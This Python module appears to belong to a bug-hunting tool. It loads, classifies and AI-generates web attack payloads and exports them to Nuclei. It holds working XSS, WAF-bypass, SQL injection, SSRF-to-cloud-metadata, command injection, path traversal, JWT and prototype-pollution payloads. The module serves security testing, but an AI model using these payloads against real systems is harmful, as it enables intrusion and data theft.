"""
Payload Manager
Centralized payload repository with AI-enhanced contextual payload generation
"""

import os
import json
import yaml
from pathlib import Path
from typing import List, Dict, Any, Optional
from dataclasses import dataclass, field
from enum import Enum


class PayloadCategory(str, Enum):
    XSS = "xss"
    SQLI = "sqli"
    SSRF = "ssrf"
    RCE = "rce"
    AUTH = "auth"
    LOGIC = "logic"
    API = "api"
    MOBILE = "mobile"
    CLOUD = "cloud"
    CUSTOM = "custom"


class PayloadContext(str, Enum):
    HTML_BODY = "html_body"
    HTML_ATTR = "html_attr"
    JS_CONTEXT = "js_context"
    JS_EVENT = "js_event"
    URL_PARAM = "url_param"
    HEADER = "header"
    COOKIE = "cookie"
    JSON_BODY = "json_body"
    XML_BODY = "xml_body"
    SQL_WHERE = "sql_where"
    SQL_UNION = "sql_union"
    LDAP = "ldap"
    XPATH = "xpath"
    TEMPLATE = "template"
    CMD_INJECTION = "cmd_injection"
    PATH_TRAVERSAL = "path_traversal"


@dataclass
class Payload:
    payload: str
    category: PayloadCategory
    context: PayloadContext = PayloadContext.URL_PARAM
    description: str = ""
    tags: List[str] = field(default_factory=list)
    bypass_technique: str = ""
    source: str = "custom"  # payloadsallthethings, seclists, fuzzdb, custom, ai
    confidence: float = 0.8
    requires_interaction: bool = False
    blind: bool = False


class PayloadManager:
    """Manages payloads for vulnerability testing"""

    def __init__(self, config_manager):
        self.config = config_manager
        self.hunting_config = config_manager.load_hunting()
        self.payloads_dir = Path(self.hunting_config.payloads.__dict__.get('payload_dir', 'payloads'))
        self.payloads: Dict[str, List[Payload]] = {}
        self._loaded = False

    def load_all(self):
        """Load all payloads from files"""
        if self._loaded:
            return

        # Load from configured directories
        for category in PayloadCategory:
            self.payloads[category.value] = []

        # Load from PayloadsAllTheThings
        self._load_payloads_all_the_things()

        # Load from SecLists
        self._load_seclists()

        # Load from custom directory
        self._load_custom_payloads()

        self._loaded = True

    def _load_payloads_all_the_things(self):
        """Load payloads from PayloadsAllTheThings repository"""
        pat_path = self.payloads_dir / "PayloadsAllTheThings"
        if not pat_path.exists():
            return

        # Map PayloadsAllTheThings categories to our categories
        category_map = {
            "XSS Injection": PayloadCategory.XSS,
            "SQL Injection": PayloadCategory.SQLI,
            "Server Side Request Forgery": PayloadCategory.SSRF,
            "Command Injection": PayloadCategory.RCE,
            "Insecure Deserialization": PayloadCategory.RCE,
            "Server Side Template Injection": PayloadCategory.RCE,
            "Path Traversal": PayloadCategory.RCE,
            "File Inclusion": PayloadCategory.RCE,
            "NoSQL Injection": PayloadCategory.SQLI,
            "LDAP Injection": PayloadCategory.SQLI,
            "XPATH Injection": PayloadCategory.SQLI,
            "JSON Web Token": PayloadCategory.AUTH,
            "OAuth Misconfiguration": PayloadCategory.AUTH,
            "Authentication": PayloadCategory.AUTH,
            "Race Condition": PayloadCategory.LOGIC,
            "Business Logic Errors": PayloadCategory.LOGIC,
            "API Key Leaks": PayloadCategory.API,
            "GraphQL Injection": PayloadCategory.API,
            "CORS Misconfiguration": PayloadCategory.API,
            "Cross-Site Request Forgery": PayloadCategory.LOGIC,
            "Clickjacking": PayloadCategory.LOGIC,
            "DOM Clobbering": PayloadCategory.XSS,
            "Prototype Pollution": PayloadCategory.XSS,
            "CSS Injection": PayloadCategory.XSS,
        }

        for cat_dir in pat_path.iterdir():
            if not cat_dir.is_dir():
                continue

            our_category = category_map.get(cat_dir.name, PayloadCategory.CUSTOM)

            # Load Intruder files (payload lists)
            intruder_dir = cat_dir / "Intruder"
            if intruder_dir.exists():
                for payload_file in intruder_dir.glob("*.txt"):
                    payloads = self._parse_payload_file(payload_file, our_category)
                    self.payloads[our_category.value].extend(payloads)

            # Load other .txt files
            for payload_file in cat_dir.rglob("*.txt"):
                if "Intruder" not in str(payload_file):
                    payloads = self._parse_payload_file(payload_file, our_category)
                    self.payloads[our_category.value].extend(payloads)

    def _load_seclists(self):
        """Load payloads from SecLists"""
        seclists_paths = [
            Path("/usr/share/seclists"),
            Path("/usr/share/wordlists/seclists"),
            Path("~/tools/SecLists").expanduser(),
        ]

        for base_path in seclists_paths:
            if not base_path.exists():
                continue

            # Fuzzing payloads
            fuzzing_dir = base_path / "Fuzzing"
            if fuzzing_dir.exists():
                for payload_file in fuzzing_dir.rglob("*.txt"):
                    category = self._guess_category_from_path(payload_file)
                    payloads = self._parse_payload_file(payload_file, category)
                    self.payloads[category.value].extend(payloads)

            # SQL Injection
            sqli_dir = base_path / "Fuzzing" / "SQLi"
            if sqli_dir.exists():
                for payload_file in sqli_dir.rglob("*.txt"):
                    payloads = self._parse_payload_file(payload_file, PayloadCategory.SQLI)
                    self.payloads[PayloadCategory.SQLI.value].extend(payloads)

            # XSS
            xss_dir = base_path / "Fuzzing" / "XSS"
            if xss_dir.exists():
                for payload_file in xss_dir.rglob("*.txt"):
                    payloads = self._parse_payload_file(payload_file, PayloadCategory.XSS)
                    self.payloads[PayloadCategory.XSS.value].extend(payloads)

    def _load_custom_payloads(self):
        """Load custom payloads from config directory"""
        custom_dirs = {
            PayloadCategory.XSS: ["xss"],
            PayloadCategory.SQLI: ["sqli"],
            PayloadCategory.SSRF: ["ssrf"],
            PayloadCategory.RCE: ["rce"],
            PayloadCategory.AUTH: ["auth"],
            PayloadCategory.LOGIC: ["logic"],
        }

        for category, subdirs in custom_dirs.items():
            for subdir in subdirs:
                custom_path = self.payloads_dir / subdir
                if custom_path.exists():
                    for payload_file in custom_path.rglob("*.txt"):
                        payloads = self._parse_payload_file(payload_file, category)
                        self.payloads[category.value].extend(payloads)

    def _parse_payload_file(self, file_path: Path, category: PayloadCategory) -> List[Payload]:
        """Parse a payload file"""
        payloads = []
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            for line in content.split('\n'):
                line = line.strip()
                if line and not line.startswith('#'):
                    # Determine context from filename
                    context = self._guess_context_from_filename(file_path.name)

                    payload = Payload(
                        payload=line,
                        category=category,
                        context=context,
                        description=f"From {file_path.name}",
                        source=file_path.parent.name,
                    )
                    payloads.append(payload)
        except Exception:
            pass
        return payloads

    def _guess_category_from_path(self, path: Path) -> PayloadCategory:
        """Guess category from file path"""
        path_str = str(path).lower()

        if 'xss' in path_str:
            return PayloadCategory.XSS
        elif 'sqli' in path_str or 'sql' in path_str:
            return PayloadCategory.SQLI
        elif 'ssrf' in path_str:
            return PayloadCategory.SSRF
        elif 'rce' in path_str or 'cmd' in path_str or 'deserial' in path_str or 'ssti' in path_str:
            return PayloadCategory.RCE
        elif 'auth' in path_str or 'jwt' in path_str or 'oauth' in path_str:
            return PayloadCategory.AUTH
        elif 'logic' in path_str or 'race' in path_str or 'bypass' in path_str:
            return PayloadCategory.LOGIC
        elif 'api' in path_str or 'graphql' in path_str:
            return PayloadCategory.API
        return PayloadCategory.CUSTOM

    def _guess_context_from_filename(self, filename: str) -> PayloadContext:
        """Guess payload context from filename"""
        filename_lower = filename.lower()

        if 'attr' in filename_lower or 'attribute' in filename_lower:
            return PayloadContext.HTML_ATTR
        elif 'js' in filename_lower or 'javascript' in filename_lower:
            return PayloadContext.JS_CONTEXT
        elif 'event' in filename_lower or 'handler' in filename_lower:
            return PayloadContext.JS_EVENT
        elif 'header' in filename_lower:
            return PayloadContext.HEADER
        elif 'cookie' in filename_lower:
            return PayloadContext.COOKIE
        elif 'json' in filename_lower:
            return PayloadContext.JSON_BODY
        elif 'xml' in filename_lower or 'xxe' in filename_lower:
            return PayloadContext.XML_BODY
        elif 'union' in filename_lower:
            return PayloadContext.SQL_UNION
        elif 'where' in filename_lower:
            return PayloadContext.SQL_WHERE
        elif 'ldap' in filename_lower:
            return PayloadContext.LDAP
        elif 'xpath' in filename_lower:
            return PayloadContext.XPATH
        elif 'template' in filename_lower or 'ssti' in filename_lower:
            return PayloadContext.TEMPLATE
        elif 'cmd' in filename_lower or 'command' in filename_lower or 'rce' in filename_lower:
            return PayloadContext.CMD_INJECTION
        elif 'path' in filename_lower or 'traversal' in filename_lower or 'lfi' in filename_lower:
            return PayloadContext.PATH_TRAVERSAL

        return PayloadContext.URL_PARAM

    def get_payloads(self, category: str, context: Optional[PayloadContext] = None,
                     limit: int = 100) -> List[Payload]:
        """Get payloads for a category, optionally filtered by context"""
        if not self._loaded:
            self.load_all()

        cat_payloads = self.payloads.get(category.lower(), [])

        if context:
            cat_payloads = [p for p in cat_payloads if p.context == context]

        # Sort by confidence
        cat_payloads.sort(key=lambda p: p.confidence, reverse=True)

        return cat_payloads[:limit]

    def get_payloads_for_vuln_type(self, vuln_type: str) -> List[Payload]:
        """Get payloads mapped from vulnerability type"""
        vuln_to_category = {
            "xss": PayloadCategory.XSS,
            "cross_site_scripting": PayloadCategory.XSS,
            "dom_xss": PayloadCategory.XSS,
            "reflected_xss": PayloadCategory.XSS,
            "stored_xss": PayloadCategory.XSS,
            "blind_xss": PayloadCategory.XSS,

            "sqli": PayloadCategory.SQLI,
            "sql_injection": PayloadCategory.SQLI,
            "blind_sqli": PayloadCategory.SQLI,
            "time_based_sqli": PayloadCategory.SQLI,
            "error_based_sqli": PayloadCategory.SQLI,
            "union_sqli": PayloadCategory.SQLI,
            "nosql_injection": PayloadCategory.SQLI,
            "ldap_injection": PayloadCategory.SQLI,
            "xpath_injection": PayloadCategory.SQLI,

            "ssrf": PayloadCategory.SSRF,
            "server_side_request_forgery": PayloadCategory.SSRF,
            "blind_ssrf": PayloadCategory.SSRF,

            "rce": PayloadCategory.RCE,
            "remote_code_execution": PayloadCategory.RCE,
            "command_injection": PayloadCategory.RCE,
            "deserialization": PayloadCategory.RCE,
            "ssti": PayloadCategory.RCE,
            "server_side_template_injection": PayloadCategory.RCE,
            "file_upload_rce": PayloadCategory.RCE,
            "path_traversal": PayloadCategory.RCE,
            "lfi": PayloadCategory.RCE,
            "rfi": PayloadCategory.RCE,

            "auth_bypass": PayloadCategory.AUTH,
            "authentication_bypass": PayloadCategory.AUTH,
            "jwt": PayloadCategory.AUTH,
            "oauth": PayloadCategory.AUTH,
            "session_fixation": PayloadCategory.AUTH,
            "privilege_escalation": PayloadCategory.AUTH,

            "idor": PayloadCategory.LOGIC,
            "insecure_direct_object_reference": PayloadCategory.LOGIC,
            "race_condition": PayloadCategory.LOGIC,
            "business_logic": PayloadCategory.LOGIC,
            "price_manipulation": PayloadCategory.LOGIC,
            "csrf": PayloadCategory.LOGIC,
            "clickjacking": PayloadCategory.LOGIC,

            "api": PayloadCategory.API,
            "graphql": PayloadCategory.API,
            "cors": PayloadCategory.API,
        }

        category = vuln_to_category.get(vuln_type.lower(), PayloadCategory.CUSTOM)
        return self.get_payloads(category.value)

    async def generate_contextual_payloads(self, vuln_type: str,
                                           reflection_context: str,
                                           waf: str = "none",
                                           technology: str = "unknown") -> List[Payload]:
        """Generate contextual payloads using AI"""
        from hunting.ai_hunter import AIHunter
        ai_hunter = AIHunter(self.config)

        payloads = await ai_hunter.suggest_payloads(vuln_type, {
            'reflection_context': reflection_context,
            'waf': waf,
            'technology': technology,
        })

        result = []
        for p in payloads:
            result.append(Payload(
                payload=p,
                category=PayloadCategory(vuln_type) if vuln_type in [c.value for c in PayloadCategory] else PayloadCategory.CUSTOM,
                context=self._guess_context_from_reflection(reflection_context),
                description=f"AI-generated for {reflection_context} context",
                source="ai",
                confidence=0.7,
            ))

        return result

    def _guess_context_from_reflection(self, reflection_context: str) -> PayloadContext:
        """Guess context from reflection context description"""
        ctx_lower = reflection_context.lower()

        if 'attribute' in ctx_lower or 'attr' in ctx_lower:
            return PayloadContext.HTML_ATTR
        elif 'javascript' in ctx_lower or 'js' in ctx_lower or 'script' in ctx_lower:
            return PayloadContext.JS_CONTEXT
        elif 'event' in ctx_lower or 'onload' in ctx_lower or 'onerror' in ctx_lower:
            return PayloadContext.JS_EVENT
        elif 'header' in ctx_lower:
            return PayloadContext.HEADER
        elif 'cookie' in ctx_lower:
            return PayloadContext.COOKIE
        elif 'json' in ctx_lower:
            return PayloadContext.JSON_BODY
        elif 'xml' in ctx_lower:
            return PayloadContext.XML_BODY
        elif 'sql' in ctx_lower:
            if 'union' in ctx_lower:
                return PayloadContext.SQL_UNION
            return PayloadContext.SQL_WHERE
        elif 'template' in ctx_lower or 'ssti' in ctx_lower:
            return PayloadContext.TEMPLATE
        elif 'command' in ctx_lower or 'cmd' in ctx_lower:
            return PayloadContext.CMD_INJECTION
        elif 'path' in ctx_lower or 'traversal' in ctx_lower:
            return PayloadContext.PATH_TRAVERSAL

        return PayloadContext.URL_PARAM

    def get_stats(self) -> Dict[str, Any]:
        """Get payload statistics"""
        if not self._loaded:
            self.load_all()

        stats = {}
        total = 0
        for category, payloads in self.payloads.items():
            stats[category] = len(payloads)
            total += len(payloads)

        stats['total'] = total
        stats['by_source'] = {}
        for category, payloads in self.payloads.items():
            for p in payloads:
                stats['by_source'][p.source] = stats['by_source'].get(p.source, 0) + 1

        return stats

    def export_for_nuclei(self, category: str, output_file: str):
        """Export payloads in Nuclei-compatible format"""
        payloads = self.get_payloads(category, limit=1000)

        # Create a Nuclei template with payloads
        template = {
            'id': f'custom-payloads-{category}',
            'info': {
                'name': f'Custom {category.upper()} Payloads',
                'author': 'bug-hunter-agent',
                'severity': 'medium',
                'tags': [category, 'custom', 'payloads'],
            },
            'requests': [{
                'method': 'GET',
                'path': ['{{BaseURL}}'],
                'payloads': {
                    'payload': [p.payload for p in payloads],
                },
                'fuzzing': [{
                    'part': 'query',
                    'mode': 'pitchfork',
                }],
                'matchers': [{
                    'type': 'status',
                    'status': [200, 403, 500],
                }],
            }],
        }

        with open(output_file, 'w') as f:
            yaml.dump(template, f, sort_keys=False)


# Pre-built payload collections for common scenarios
class PayloadCollections:
    """Pre-built payload collections for quick access"""

    @staticmethod
    def xss_basic() -> List[str]:
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            "<textarea autofocus onfocus=alert(1)>",
        ]

    @staticmethod
    def xss_waf_bypass() -> List[str]:
        return [
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<audio src onloadstart=alert(1)>",
            "<video src onloadstart=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            "<textarea autofocus onfocus=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<isindex type=image src=1 onerror=alert(1)>",
        ]

    @staticmethod
    def sqli_error_based() -> List[str]:
        return [
            "'",
            '"',
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR '1'='1' --",
            '" OR "1"="1" --',
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' UNION SELECT NULL,NULL,NULL--",
        ]

    @staticmethod
    def sqli_blind() -> List[str]:
        return [
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR '1'='1",
            "' OR '1'='2",
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
            "' OR SLEEP(5)--",
        ]

    @staticmethod
    def ssrf_basic() -> List[str]:
        return [
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://localhost:80",
            "http://127.0.0.1:80",
            "http://169.254.169.254",  # AWS metadata
            "http://metadata.google.internal",  # GCP metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/latest/user-data",
        ]

    @staticmethod
    def ssrf_bypass() -> List[str]:
        return [
            "http://127.0.0.1.xip.io",
            "http://localtest.me",
            "http://lvh.me",
            "http://[::1]",
            "http://0.0.0.0",
            "http://2130706433",  # 127.0.0.1 as decimal
            "http://0x7f000001",  # 127.0.0.1 as hex
            "http://127.1",
            "http://127.0.0.1:80@evil.com",
            "http://evil.com@127.0.0.1",
        ]

    @staticmethod
    def rce_basic() -> List[str]:
        return [
            "; id",
            "| id",
            "& id",
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            "|id",
            ";cat /etc/passwd",
            "|cat /etc/passwd",
        ]

    @staticmethod
    def path_traversal() -> List[str]:
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/var/www/../../etc/passwd",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]

    @staticmethod
    def jwt_algo_confusion() -> List[str]:
        return [
            '{"alg":"none","typ":"JWT"}',
            '{"alg":"HS256","typ":"JWT"}',
            '{"alg":"RS256","typ":"JWT"}',
        ]

    @staticmethod
    def prototype_pollution() -> List[str]:
        return [
            '{"__proto__":{"polluted":"yes"}}',
            '{"constructor":{"prototype":{"polluted":"yes"}}}',
            '{"__proto__":{"toString":{"value":"polluted"}}}',
        ]


# Convenience function
def get_payload_manager(config_manager=None) -> PayloadManager:
    """Get a payload manager instance"""
    return PayloadManager(config_manager or get_config())